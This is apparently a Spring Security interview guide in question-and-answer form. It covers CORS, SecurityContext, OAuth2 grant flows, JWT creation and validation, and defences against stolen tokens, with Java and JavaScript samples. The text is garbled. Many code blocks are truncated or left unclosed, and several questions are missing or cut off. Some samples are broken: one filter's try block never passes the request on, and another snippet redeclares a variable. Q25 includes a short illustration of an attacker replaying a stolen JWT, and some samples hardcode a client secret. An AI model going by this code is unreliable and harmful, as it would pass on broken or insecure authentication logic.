| X-Content-Type-Options | Prevent MIME sniffing | `nosniff` |
| X-XSS-Protection | XSS filter | `1; mode=block` |
| Referrer-Policy | Control referrer | `strict-origin-when-cross-origin` |
| Permissions-Policy | Feature restrictions | Restrict sensitive features |

**Interview Tip:** "Key security headers: HSTS (HTTPS enforcement), CSP (XSS prevention), X-Frame-Options (clickjacking), X-Content-Type-Options (MIME sniffing), Referrer-Policy (referrer info). Configure via Spring Security's `headers()` DSL. Test with browser dev tools or `curl -I`."

## Q10. Explain CORS in Spring Boot Security?

**Answer:**  
CORS (Cross-Origin Resource Sharing) allows **web applications running at one origin** to access resources from **another origin**.

**The Problem (Same-Origin Policy):**
```
Frontend: http://localhost:3000
Backend API: http://localhost:8080
❌ Browser blocks request because origins don't match
```

**CORS Configuration in Spring Security:**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.disable())  // Disable CSRF for CORS
            .authorizeHttpRequests(auth -> auth
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        
        // Allow specific origins
        configuration.setAllowedOrigins(Arrays.asList(
            "http://localhost:3000",
            "https://myapp.com"
        ));
        
        // Allow specific methods
        configuration.setAllowedMethods(Arrays.asList(
            "GET", "POST", "PUT", "DELETE", "OPTIONS"
        ));
        
        // Allow specific headers
        configuration.setAllowedHeaders(Arrays.asList(
            "Authorization", "Content-Type", "X-Requested-With"
        ));
        
        // Allow credentials (cookies, auth headers)
        configuration.setAllowCredentials(true);
        
        // Expose headers to frontend
        configuration.setExposedHeaders(Arrays.asList(
            "Authorization", "X-CSRF-TOKEN"
        ));
        
        // Max age of preflight request (seconds)
        configuration.setMaxAge(3600L);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", configuration);
        source.registerCorsConfiguration("/public/**", new CorsConfiguration().applyPermitDefaultValues());
        
        return source;
    }
}
```

**Global CORS Configuration:**

```java

## Q11. What is CrossOrigin annotation in Spring Boot?

**Answer:**  
`@CrossOrigin` enables CORS at **controller or method level** - fine-grained control over which origins can access specific endpoints.

**Basic Usage:**

```java
@RestController
@RequestMapping("/api/users")
@CrossOrigin(origins = "http://localhost:3000")  // Class level
public class UserController {
    
    @GetMapping
    public List<User> getAllUsers() {
        return userService.findAll();
    }
    
    @GetMapping("/{id}")
    @CrossOrigin(origins = "https://mobileapp.com")  // Overrides class level
    public User getUser(@PathVariable Long id) {
        return userService.findById(id);
    }
    
    @PostMapping
    @CrossOrigin(origins = "*")  // Allow any origin (not for credentials)
    public User createUser(@RequestBody User user) {
        return userService.save(user);
    }
}
```

**All Attributes:**

@Component
public class CustomPermissionEvaluator implements PermissionEvaluator {
    
    @Override
    public boolean hasPermission(Authentication auth, Object targetDomainObject, Object permission) {
        if (auth == null || targetDomainObject == null) return false;
        
        UserDetails user = (UserDetails) auth.getPrincipal();
        
        if (targetDomainObject instanceof Document) {
            Document doc = (Document) targetDomainObject;
            if ("read".equals(permission)) {
                return doc.isPublic() || doc.getOwner().equals(user.getUsername());
            }
            if ("write".equals(permission)) {
                return doc.getOwner().equals(user.getUsername()) || hasRole(user, "ADMIN");
            }
        }
        return false;
    }
    
    @Override
    public boolean hasPermission(Authentication auth, Serializable targetId, 
                                 String targetType, Object permission) {
        // For ID-based permission checking
        return false;
    }
    
    private boolean hasRole(UserDetails user, String role) {
        return user.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_" + role));
    }
}

## Q13. Explain SecurityContext and SecurityContextHolder in Spring Security?

**Answer:**  
`SecurityContext` holds authentication information for current user. `SecurityContextHolder` manages the `SecurityContext` for the current thread.

**Architecture:**
```
SecurityContextHolder (manages context storage strategy)
    │
    └── SecurityContext (current security context)
            │
            └── Authentication (current user's authentication)
                    ├── principal (UserDetails)
                    ├── credentials (password/token - cleared)
                    ├── authorities (roles/permissions)
                    ├── details (request details)
                    └── authenticated (true/false)
```

**SecurityContextHolder Strategies:**

```java
// Strategy 1: MODE_THREADLOCAL (default)
// Each thread has its own SecurityContext
SecurityContextHolder.setStrategyName(SecurityContextHolder.MODE_THREADLOCAL);

// Strategy 2: MODE_INHERITABLETHREADLOCAL
// Child threads inherit parent's SecurityContext
SecurityContextHolder.setStrategyName(SecurityContextHolder.MODE_INHERITABLETHREADLOCAL);

// Strategy 3: MODE_GLOBAL
// Single context for all threads (rarely used)
SecurityContextHolder.setStrategyName(SecurityContextHolder.MODE_GLOBAL);

// Configure via system property
System.setProperty("spring.security.strategy", 
                   SecurityContextHolder.MODE_INHERITABLETHREADLOCAL);
```

**Basic Usage:**

```java
// Get current authentication
Authentication auth = SecurityContextHolder.getContext().getAuthentication();

// Get username
String username = auth.getName();

// Get user details
Object principal = auth.getPrincipal();
if (principal instanceof UserDetails) {
    UserDetails userDetails = (UserDetails) principal;
    String username = userDetails.getUsername();
    Collection<? extends GrantedAuthority> authorities = userDetails.getAuthorities();
}

// Get authorities/roles
Collection<? extends GrantedAuthority> authorities = auth.getAuthorities();
boolean isAdmin = authorities.stream()
    .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"));

// Check if authenticated
boolean isAuthenticated = auth != null && auth.isAuthenticated() 
    && !(auth instanceof AnonymousAuthenticationToken);
```

// How Spring Security manages SecurityContext
public class SecurityContextPersistenceFilter extends GenericFilterBean {
    
    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        
        // Load context from session (or create new)
        SecurityContext context = loadContext(request);
        SecurityContextHolder.setContext(context);
        
        try {

            // Save context to session if changed
            saveContext(context, request, response);
            SecurityContextHolder.clearContext();
        }
    }
}

## Q14. How does Spring Security integrate with OAuth2 for Authorization?

**Answer:**  
Spring Security provides OAuth2 integration for **delegated authorization** - allowing users to grant third-party applications access to their resources without sharing credentials.

**OAuth2 Roles:**
```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   Resource  │     │  Resource   │     │ Authorization│

## Q15. What do you mean by OAuth2 Authorization Code Grant Type?

**Answer:**  
Authorization Code Grant is the **most secure OAuth2 flow** for server-side applications where client secret can be kept confidential. It uses an **intermediate authorization code** instead of directly returning the access token.

**Flow Diagram:**
```
┌────────┐  1. Auth Request  ┌──────────┐
│  User  │─────────────────▶│   Auth   │
│        │◀─────────────────│  Server  │
└────────┘  2. Login Page    └──────────┘
    │                              │
    │  3. User Credentials         │
    │─────────────────────────────▶│
    │                              │
    │  4. Authorization Code       │
    │◀─────────────────────────────│
    │                              │
    │  5. Redirect with Code       │
    │─────────────────────────────▶│
    │                           ┌──┴──┐
    │                           │Client│
    │                           │ App │
    │                           └──┬──┘
    │  6. Exchange Code + Secret   │
    │◀─────────────────────────────│
    │                              │
    │  7. Access Token + Refresh   │
    │─────────────────────────────▶│
    │                              │
    │  8. API Call with Token      │
    │─────────────────────────────▶│
    │                           ┌──┴──┐
    │                           │ API │
    │                           └─────┘
```

@Service
public class OAuth2TokenService {
    
    @Autowired
    private RestTemplate restTemplate;
    
    public TokenResponse exchangeCodeForToken(String code, String redirectUri) {
        String tokenUrl = "http://auth-server:9000/oauth2/token";
        
        MultiValueMap<String, String> params = new LinkedMultiValueMap<>();
        params.add("grant_type", "authorization_code");
        params.add("code", code);
        params.add("redirect_uri", redirectUri);
        params.add("client_id", "my-client");
        params.add("client_secret", "secret");
        
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        
        HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<>(params, headers);
        
        ResponseEntity<TokenResponse> response = restTemplate.exchange(
            tokenUrl,
            HttpMethod.POST,
            request,
            TokenResponse.class
        );
        
        return response.getBody();
    }
}

```java
// 1. Access token never exposed to user agent (browser)
// 2. Client secret required to exchange code for token
// 3. Code is short-lived and single-use
// 4. Supports refresh tokens for long-lived access

// Why it's secure:
// - Even if someone intercepts the authorization code, they need client secret
// - Token returned directly to client server, not through browser
// - No credentials in browser history or logs

**PKCE Extension (for Public Clients):**

```java
// For mobile/SPA apps that can't store client secret
@Service
public class PkceService {
    
    public String generateCodeVerifier() {
        byte[] codeVerifier = new byte[32];
        new SecureRandom().nextBytes(codeVerifier);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(codeVerifier);
    }
    
    public String generateCodeChallenge(String codeVerifier) {
        byte[] bytes = codeVerifier.getBytes(StandardCharsets.US_ASCII);
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] digest = md.digest(bytes);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(digest);
    }
}

// Authorization request includes code_challenge
// Token request includes code_verifier
// Server verifies challenge matches verifier
```

**Authorization Code vs Other Grants:**

| Grant Type | Use Case | Security |
|------------|----------|----------|
| Authorization Code | Server-side web apps | Most secure |
| Implicit (deprecated) | SPAs (legacy) | Less secure |
| Client Credentials | Machine-to-machine | High (no user) |
| Resource Owner Password (deprecated) | Trusted apps | Low |
| Device Code | Input-limited devices | Medium |

**Interview Tip:** "Authorization Code Grant = most secure OAuth2 flow. Uses temporary code (not token) returned to browser. Client exchanges code + secret for token server-to-server. Supports refresh tokens. Use for server-side web apps. For SPAs, use Authorization Code with PKCE."

@Component
public class CustomAccessDeniedHandler implements AccessDeniedHandler {
    
    @Autowired
    private MessageSource messageSource;
    
    @Override
    public void handle(HttpServletRequest request, HttpServletResponse response,
                       AccessDeniedException accessDeniedException) throws IOException, ServletException {
        
        // Log the access denied
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        if (auth != null) {
            System.out.println("User: " + auth.getName() 
                + " attempted to access: " + request.getRequestURI());
        }
        
        // Set response status
        response.setStatus(HttpServletResponse.SC_FORBIDDEN);
        
        // For JSON API
        if (request.getHeader("Accept").contains("application/json")) {
            response.setContentType("application/json");
            response.getWriter().write("{\"error\": \"Access Denied\", \"path\": \"" 
                + request.getRequestURI() + "\"}");
            return;
        }
        
        // For web page
        request.setAttribute("errorMessage", "You don't have permission to access this resource");
        request.setAttribute("path", request.getRequestURI());
        request.setAttribute("timestamp", LocalDateTime.now());
        
        request.getRequestDispatcher("/access-denied").forward(request, response);
    }
}

**Method 3: Role-based Redirection**

```java
@Component
public class RoleBasedAccessDeniedHandler implements AccessDeniedHandler {
    
    @Override
    public void handle(HttpServletRequest request, HttpServletResponse response,
                       AccessDeniedException accessDeniedException) throws IOException, ServletException {
        
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        String redirectUrl = "/access-denied";
        
        // Different redirects based on user's roles
        if (auth != null && auth.getAuthorities() != null) {
            boolean isAdmin = auth.getAuthorities().stream()
                .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"));
            boolean isManager = auth.getAuthorities().stream()
                .anyMatch(a -> a.getAuthority().equals("ROLE_MANAGER"));
            
            if (isAdmin) {
                redirectUrl = "/admin/access-denied";
            } else if (isManager) {
                redirectUrl = "/manager/access-denied";
            }
        }
        
        response.sendRedirect(redirectUrl);
    }
}

## Q17. How would you use Spring Security at the API Gateway to authenticate and authorize requests before routing them to microservices?

**Answer:**  
API Gateway acts as **security entry point** - authenticates user, validates token, and forwards authenticated requests to downstream microservices.

**Architecture:**
```
Client → API Gateway (Spring Cloud Gateway + Spring Security)

@Component
public class GatewayJwtAuthenticationConverter implements Converter<Jwt, Mono<AbstractAuthenticationToken>> {
    
    @Override
    public Mono<AbstractAuthenticationToken> convert(Jwt jwt) {
        // Extract claims
        String userId = jwt.getClaimAsString("user_id");
        String username = jwt.getClaimAsString("sub");
        List<String> roles = jwt.getClaimAsStringList("roles");
        List<String> authorities = jwt.getClaimAsStringList("authorities");
        
        if (username == null || roles == null) {
            return Mono.empty();
        }
        
        // Create authorities
        List<SimpleGrantedAuthority> grantedAuthorities = roles.stream()
            .map(role -> new SimpleGrantedAuthority("ROLE_" + role))
            .collect(Collectors.toList());
        
        // Create authentication token with additional details
        UsernamePasswordAuthenticationToken auth = 
            new UsernamePasswordAuthenticationToken(username, null, grantedAuthorities);
        
        // Add custom details to be passed to downstream services
        Map<String, Object> details = new HashMap<>();
        details.put("user_id", userId);
        details.put("username", username);
        details.put("roles", roles);
        auth.setDetails(details);
        
        return Mono.just(auth);
    }
}

```java
@Component
@Order(-1)
public class UserContextFilter implements GlobalFilter {
    
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        
        // Extract authentication from SecurityContext
        return Mono.justOrEmpty(SecurityContextHolder.getContext().getAuthentication())
            .flatMap(auth -> {
                ServerHttpRequest mutatedRequest = request;
                
                // Add user headers for downstream services
                mutatedRequest = addUserHeaders(mutatedRequest, auth);
                
                // Add JWT token
                String token = extractToken(request);
                if (token != null) {
                    mutatedRequest = mutatedRequest.mutate()
                        .header("Authorization", "Bearer " + token)
                        .build();
                }
                
                ServerWebExchange mutatedExchange = exchange.mutate()
                    .request(mutatedRequest)
                    .build();
                
                return chain.filter(mutatedExchange);
            })
            .switchIfEmpty(chain.filter(exchange));
    }
    
    private ServerHttpRequest addUserHeaders(ServerHttpRequest request, Authentication auth) {
        ServerHttpRequest.Builder builder = request.mutate();
        
        // Add user information as headers
        builder.header("X-User-Id", getUserId(auth));
        builder.header("X-Username", auth.getName());
        
        // Add roles
        String roles = auth.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .collect(Collectors.joining(","));
        builder.header("X-User-Roles", roles);
        
        // Add custom details
        if (auth.getDetails() instanceof Map) {
            @SuppressWarnings("unchecked")
            Map<String, Object> details = (Map<String, Object>) auth.getDetails();
            if (details.containsKey("user_id")) {
                builder.header("X-User-Id", details.get("user_id").toString());
            }
        }
        
        return builder.build();
    }
    
    private String getUserId(Authentication auth) {
        // Extract user ID from principal or details
        if (auth.getDetails() instanceof Map) {
            @SuppressWarnings("unchecked")
            Map<String, Object> details = (Map<String, Object>) auth.getDetails();
            if (details.containsKey("user_id")) {
                return details.get("user_id").toString();
            }
        }
        return auth.getName();
    }
    
    private String extractToken(ServerHttpRequest request) {
        String authHeader = request.getHeaders().getFirst("Authorization");
        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            return authHeader.substring(7);
        }
        return null;
    }
}

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        
        // Check if route requires specific role
        String path = request.getPath().toString();
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        
        if (path.startsWith("/api/admin") && !hasRole(auth, "ADMIN")) {
            exchange.getResponse().setStatusCode(HttpStatus.FORBIDDEN);
            return exchange.getResponse().setComplete();
        }
        
        if (path.startsWith("/api/manager") && !hasRole(auth, "MANAGER")) {
            exchange.getResponse().setStatusCode(HttpStatus.FORBIDDEN);
            return exchange.getResponse().setComplete();
        }
        
        return chain.filter(exchange);
    }
    
    private boolean hasRole(Authentication auth, String role) {
        return auth != null && auth.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_" + role));

## Q18. How JWT token works in Java?

**Answer:**  
JWT (JSON Web Token) is a **compact, URL-safe token** that carries claims between parties. It consists of three parts: Header, Payload, Signature.

**JWT Token Provider Service:**

```java
@Component
public class JwtTokenProvider {
    
    @Value("${jwt.secret}")
    private String jwtSecret;
    
    @Value("${jwt.expiration}")
    private int jwtExpirationMs;
    
    @Value("${jwt.refresh-expiration}")
    private int refreshExpirationMs;
    
    // Generate JWT token
    public String generateToken(UserDetails userDetails) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("roles", userDetails.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .collect(Collectors.toList()));
        claims.put("userId", ((CustomUserDetails) userDetails).getId());
        
        return Jwts.builder()
            .setClaims(claims)
            .setSubject(userDetails.getUsername())
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + jwtExpirationMs))
            .signWith(getSigningKey(), SignatureAlgorithm.HS512)
            .compact();
    }
    
    // Generate refresh token
    public String generateRefreshToken(String username) {
        return Jwts.builder()
            .setSubject(username)
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + refreshExpirationMs))
            .signWith(getSigningKey(), SignatureAlgorithm.HS512)
            .compact();
    }
    
    // Get signing key
    private Key getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(jwtSecret);
        return Keys.hmacShaKeyFor(keyBytes);
    }
    
    // Get username from token
    public String getUsernameFromToken(String token) {
        return Jwts.parserBuilder()
            .setSigningKey(getSigningKey())
            .build()
            .parseClaimsJws(token)
            .getBody()
            .getSubject();
    }
    
    // Validate token
    public boolean validateToken(String token) {
        try {
            Jwts.parserBuilder()
                .setSigningKey(getSigningKey())
                .build()
                .parseClaimsJws(token);
            return true;
        } catch (SignatureException e) {
            System.out.println("Invalid JWT signature");
        } catch (MalformedJwtException e) {
            System.out.println("Invalid JWT token");
        } catch (ExpiredJwtException e) {
            System.out.println("Expired JWT token");
        } catch (UnsupportedJwtException e) {
            System.out.println("Unsupported JWT token");
        } catch (IllegalArgumentException e) {
            System.out.println("JWT claims string is empty");
        }
        return false;
    }
    
    // Get claims
    public Claims getClaimsFromToken(String token) {
        return Jwts.parserBuilder()
            .setSigningKey(getSigningKey())
            .build()
            .parseClaimsJws(token)
            .getBody();
    }
    
    // Check if token is expired
    public boolean isTokenExpired(String token) {
        Date expiration = getClaimsFromToken(token).getExpiration();
        return expiration.before(new Date());
    }
    
    // Refresh token
    public String refreshToken(String token) {
        if (validateToken(token) && !isTokenExpired(token)) {
            String username = getUsernameFromToken(token);
            return generateToken(loadUserByUsername(username));
        }
        throw new RuntimeException("Invalid refresh token");
    }
}

    private JwtTokenProvider tokenProvider;
    
    @Autowired

    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {

            if (StringUtils.hasText(jwt) && tokenProvider.validateToken(jwt)) {
                String username = tokenProvider.getUsernameFromToken(jwt);
                
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                UsernamePasswordAuthenticationToken authentication = 
                    new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
                
                SecurityContextHolder.getContext().setAuthentication(authentication);

            logger.error("Could not set user authentication in security context", ex);
        }
        
        filterChain.doFilter(request, response);
    }

        String bearerToken = request.getHeader("Authorization");
        if (StringUtils.hasText(bearerToken) && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7);
        }
        return null;

## Q19. What are differences between Authentication and Authorization?

**Answer:**

| Feature | Authentication | Authorization |
|---------|----------------|---------------|
| **Purpose** | Verify identity | Verify permissions |
| **Question** | "Who are you?" | "What can you do?" |
| **Timing** | First (login) | After authentication |
| **Data** | Username, password, biometrics | Roles, permissions, scopes |
| **Failure result** | HTTP 401 Unauthorized | HTTP 403 Forbidden |
| **Common methods** | Login form, OAuth, JWT | RBAC, ACL, Permissions |
| **Example** | "I am John" | "John can read, not write" |

## Q20. How JWT authentication is stateless?

**Answer:**  
JWT authentication is stateless because the **server doesn't store session state**. All necessary user information is contained within the JWT token itself.

**Stateless vs Stateful Comparison:**

```
STATEFUL (Session-based):
┌────────┐     ┌────────┐     ┌─────────────────┐
│ Client │────▶│ Server │────▶│ Session Store   │
│        │◀────│        │     │ (Redis/Memory)  │
└────────┘     └────────┘     └─────────────────┘
- Server stores session ID
- Session data on server
- Needs shared session store for scaling

STATELESS (JWT-based):
┌────────┐     ┌────────┐
│ Client │────▶│ Server │
│        │◀────│        │
└────────┘     └────────┘
- JWT contains all data
- No server-side storage
- Scales horizontally easily
```

**How Stateless JWT Works:**

```java
@Component
public class StatelessJwtService {
    
    // 1. Server generates JWT with all user data
    public String generateToken(User user) {
        return Jwts.builder()
            .setSubject(user.getUsername())
            .claim("userId", user.getId())
            .claim("roles", user.getRoles())
            .claim("permissions", user.getPermissions())
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + 3600000))
            .signWith(SECRET_KEY)
            .compact();
    }
    
    // 2. Server validates JWT without any database call
    public Authentication validateToken(String token) {
        Claims claims = Jwts.parserBuilder()
            .setSigningKey(SECRET_KEY)
            .build()
            .parseClaimsJws(token)
            .getBody();
        
        // Extract user info from token - NO DB CALL!
        String username = claims.getSubject();
        Long userId = claims.get("userId", Long.class);
        List<String> roles = claims.get("roles", List.class);
        
        // Create authentication object
        List<GrantedAuthority> authorities = roles.stream()
            .map(role -> new SimpleGrantedAuthority("ROLE_" + role))
            .collect(Collectors.toList());
        
        return new UsernamePasswordAuthenticationToken(username, null, authorities);
    }
}
```

## Q22. Which algorithm implementation you have used to generate a JWT token?

**Answer:**  
I've used **HMAC-SHA256 (HS256)** for symmetric signing and **RSA256 (RS256)** for asymmetric signing.

**Implementation Examples:**

**1. HMAC-SHA256 (HS256) - Symmetric:**

public class HmacJwtService {

                .setSigningKey(getSigningKey())
                .build()
                .parseClaimsJws(token);

            return false;
        }
    }

**2. RSA256 (RS256) - Asymmetric:**

```java
@Component
public class RsaJwtService {
    
    @Value("${jwt.private-key}")
    private Resource privateKeyResource;
    
    @Value("${jwt.public-key}")
    private Resource publicKeyResource;
    
    private PrivateKey privateKey;
    private PublicKey publicKey;
    
    @PostConstruct
    public void init() throws IOException {
        String privateKeyContent = new String(privateKeyResource.getInputStream().readAllBytes());
        String publicKeyContent = new String(publicKeyResource.getInputStream().readAllBytes());
        
        privateKey = loadPrivateKey(privateKeyContent);
        publicKey = loadPublicKey(publicKeyContent);
    }
    
    private PrivateKey loadPrivateKey(String key) throws IOException {
        String privateKeyPEM = key
            .replace("-----BEGIN PRIVATE KEY-----", "")
            .replace("-----END PRIVATE KEY-----", "")
            .replaceAll("\\s", "");
        
        byte[] decoded = Base64.getDecoder().decode(privateKeyPEM);
        PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(decoded);
        KeyFactory kf = KeyFactory.getInstance("RSA");
        return kf.generatePrivate(spec);
    }
    
    private PublicKey loadPublicKey(String key) throws IOException {
        String publicKeyPEM = key
            .replace("-----BEGIN PUBLIC KEY-----", "")
            .replace("-----END PUBLIC KEY-----", "")
            .replaceAll("\\s", "");
        
        byte[] decoded = Base64.getDecoder().decode(publicKeyPEM);
        X509EncodedKeySpec spec = new X509EncodedKeySpec(decoded);
        KeyFactory kf = KeyFactory.getInstance("RSA");
        return kf.generatePublic(spec);
    }
    
    public String generateToken(String username) {
        return Jwts.builder()
            .setSubject(username)
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + 3600000))
            .signWith(privateKey, SignatureAlgorithm.RS256)  // RS256
            .compact();
    }
    
    public boolean validateToken(String token) {
        try {
            Jwts.parserBuilder()
                .setSigningKey(publicKey)
                .build()
                .parseClaimsJws(token);
            return true;
        } catch (JwtException e) {
            return false;
        }
    }
}
```

## Q23. Types of Signing Algorithms while creating JWT Token?

JWT supports multiple signing algorithms categorized into **HMAC** (symmetric) and **RSA/ECDSA** (asymmetric).

**Algorithm Categories:**

| Category | Algorithms | Key Type | Security Level |
|----------|------------|----------|----------------|
| **HMAC** | HS256, HS384, HS512 | Symmetric (shared secret) | High (with strong secret) |
| **RSA** | RS256, RS384, RS512 | Asymmetric (RSA key pair) | Very High |
| **ECDSA** | ES256, ES384, ES512 | Asymmetric (EC key pair) | Very High (smaller keys) |

## Q24. How do you handle JWT tokens in a React app?

**Answer:**  
In React app, JWT tokens are typically stored in **memory** or **httpOnly cookies** and included in API requests via **Authorization header**.

**Recommended Approach: Store in Memory + HttpOnly Cookie:**

```javascript
// auth.service.js
class AuthService {
    
    // Store token in memory (not localStorage)
    constructor() {
        this.token = null;
        this.refreshToken = null;
        this.user = null;
    }
    
    // Login - get tokens from server
    async login(username, password) {
        const response = await fetch('/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password }),
            credentials: 'include'  // Important for cookies
        });
        
        const data = await response.json();
        
        // Store access token in memory (not localStorage)
        this.token = data.accessToken;
        this.user = data.user;
        
        // Refresh token is in httpOnly cookie (invisible to JS)
        return data;
    }
    
    // Get current token for API calls
    getToken() {
        return this.token;
    }
    
    // Logout
    async logout() {
        await fetch('/api/auth/logout', {
            method: 'POST',
            credentials: 'include'
        });
        this.token = null;
        this.user = null;
    }
    
    // Refresh token automatically
    async refreshToken() {
        const response = await fetch('/api/auth/refresh', {
            method: 'POST',
            credentials: 'include'
        });
        
        const data = await response.json();
        this.token = data.accessToken;
        return this.token;
    }
}
```

**Axios Interceptor for Automatic Token Management:**

```javascript
// axios.config.js
import axios from 'axios';
import authService from './auth.service';

const apiClient = axios.create({
    baseURL: process.env.REACT_APP_API_URL,
    timeout: 10000
});

// Request interceptor - add token to every request
apiClient.interceptors.request.use(
    (config) => {
        const token = authService.getToken();
        if (token) {
            config.headers['Authorization'] = `Bearer ${token}`;
        }
        return config;
    },
    (error) => Promise.reject(error)
);

// Response interceptor - handle token refresh
apiClient.interceptors.response.use(
    (response) => response,
    async (error) => {
        const originalRequest = error.config;
        
        // If 401 and not already retrying
        if (error.response?.status === 401 && !originalRequest._retry) {
            originalRequest._retry = true;
            
            try {
                // Try to refresh token
                const newToken = await authService.refreshToken();
                
                // Retry original request with new token
                originalRequest.headers['Authorization'] = `Bearer ${newToken}`;
                return apiClient(originalRequest);
            } catch (refreshError) {
                // Refresh failed - redirect to login
                authService.logout();
                window.location.href = '/login';
                return Promise.reject(refreshError);
            }
        }
        
        return Promise.reject(error);
    }
);

export default apiClient;

## Q25. What If a person gets valid token from other and he tries to hit that api from postman?

**Answer:**  
If someone steals a valid JWT, they can **impersonate the user** until the token expires. This is a **token theft** scenario.

**The Problem:**

```javascript
// Attacker gets token via:
// 1. XSS attack
// 2. Network sniffing (if not HTTPS)
// 3. Device compromise
// 4. Browser extension

// Attacker uses token in Postman
fetch('https://api.example.com/user/profile', {
    headers: {
        'Authorization': 'Bearer stolen_jwt_token'
    }
});
// Success! Server thinks it's the legitimate user

    public String generateToken(String username, HttpServletRequest request) {
        String fingerprint = generateFingerprint(request);
        
        return Jwts.builder()
            .setSubject(username)
            .claim("fingerprint", fingerprint)
            .claim("userAgent", request.getHeader("User-Agent"))
            .claim("ipHash", hashIp(request.getRemoteAddr()))
            .setExpiration(new Date(System.currentTimeMillis() + 900000))
            .signWith(SECRET_KEY)
            .compact();
    }
    
    public boolean validateToken(String token, HttpServletRequest request) {
        Claims claims = getClaims(token);
        
        String storedFingerprint = claims.get("fingerprint", String.class);
        String currentFingerprint = generateFingerprint(request);
        
        // Check if token is being used from same device
        if (!storedFingerprint.equals(currentFingerprint)) {
            // Token stolen! Revoke all user tokens
            revokeAllUserTokens(claims.getSubject());
            return false;
        }
        
        return true;
    }

        String acceptLanguage = request.getHeader("Accept-Language");

@Component
public class TokenAnomalyDetector {
    
    @Autowired
    private RedisTemplate<String, String> redisTemplate;
    
    public void detectAnomaly(String token, HttpServletRequest request) {
        String username = getUsernameFromToken(token);
        String currentIp = request.getRemoteAddr();
        String currentUserAgent = request.getHeader("User-Agent");
        
        // Get previous usage pattern
        String previousIp = redisTemplate.opsForValue().get("user:lastIp:" + username);
        String previousUserAgent = redisTemplate.opsForValue().get("user:lastAgent:" + username);
        
        // Detect unusual access

            // IP changed - could be token theft

            // Require additional verification
            requireTwoFactorAuth(username);

            // User agent changed - possible token theft
            revokeToken(token);
            sendAlertEmail(username, "New device detected");
        }
        
        // Update last used info
        redisTemplate.opsForValue().set("user:lastIp:" + username, currentIp, 1, TimeUnit.HOURS);

        sessionStorage.setItem('sessionId', this.sessionId);
    }
    
    generateSessionId() {
        return crypto.randomUUID();
    }
    
    getToken() {
        // Return token + session binding
        return {
            token: this.token,
            sessionId: this.sessionId
        };
    }
}

// Server validates session binding
@PostMapping("/api/data")
public ResponseEntity<?> getData(@RequestHeader("Authorization") String token,
                                  @RequestHeader("X-Session-Id") String sessionId) {
    // Check if token is bound to this session
    if (!tokenService.isTokenBoundToSession(token, sessionId)) {
        throw new SecurityException("Invalid session binding");
    }
    // Process request
}

```java
@Configuration
public class ComprehensiveJwtSecurity {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // 1. Use HTTPS only
            .requiresChannel(channel -> channel
                .anyRequest().requiresSecure()
            )
            
            // 2. Short-lived tokens
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            
            // 3. Add security headers
            .headers(headers -> headers
                .contentSecurityPolicy("default-src 'self'")
                .httpStrictTransportSecurity(hsts -> hsts
                    .maxAgeInSeconds(31536000)
                    .includeSubDomains(true)
                )
            )
            
            // 4. Custom JWT filter with revocation check
            .addFilterBefore(jwtWithRevocationFilter(), UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
}
